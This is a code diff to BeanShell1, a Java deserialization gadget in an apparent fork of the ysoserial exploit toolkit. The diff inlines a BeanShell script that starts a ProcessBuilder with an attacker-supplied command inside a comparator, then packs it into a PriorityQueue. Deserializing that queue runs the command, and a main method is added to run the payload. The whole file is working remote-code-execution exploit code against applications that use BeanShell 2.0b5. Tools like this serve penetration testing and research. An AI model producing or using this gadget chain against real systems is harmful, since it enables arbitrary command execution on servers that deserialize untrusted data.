@@ -1,10 +1,13 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.Strings;
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import bsh.Interpreter;
 import bsh.XThis;
 
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
+import java.util.Arrays;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
@@ -12,7 +15,6 @@ import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.utils.Reflections;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.utils.BeanShellUtil;
 
 /**
  * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
@@ -21,10 +23,15 @@ import A.R.ysogate.payloads.utils.BeanShellUtil;
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"org.beanshell:bsh:2.0b5"})
 @Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
-public class BeanShell1 implements ObjectPayload<PriorityQueue> {
+public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
 
 	public PriorityQueue getObject(String command) throws Exception {
-		String      payload = BeanShellUtil.makeBeanShellPayload(command);
+		String payload =
+				"compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
+						Strings.join( // does not support spaces in quotes
+								Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
+								",", "\"", "\"") +
+						"}).start();return new Integer(1);}";
 		Interpreter i       = new Interpreter();
 		Reflections.getMethodAndInvoke(i, "setu", new Class[]{String.class, Object.class}, new Object[]{"bsh.cwd", "."});
 		i.eval(payload);
@@ -36,5 +43,8 @@ public class BeanShell1 implements ObjectPayload<PriorityQueue> {
 		Reflections.setFieldValue(priorityQueue, "queue", queue);
 		Reflections.setFieldValue(priorityQueue, "size", Integer.valueOf(2));
 		return priorityQueue;
+	}
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(BeanShell1.class, args);
 	}
 }
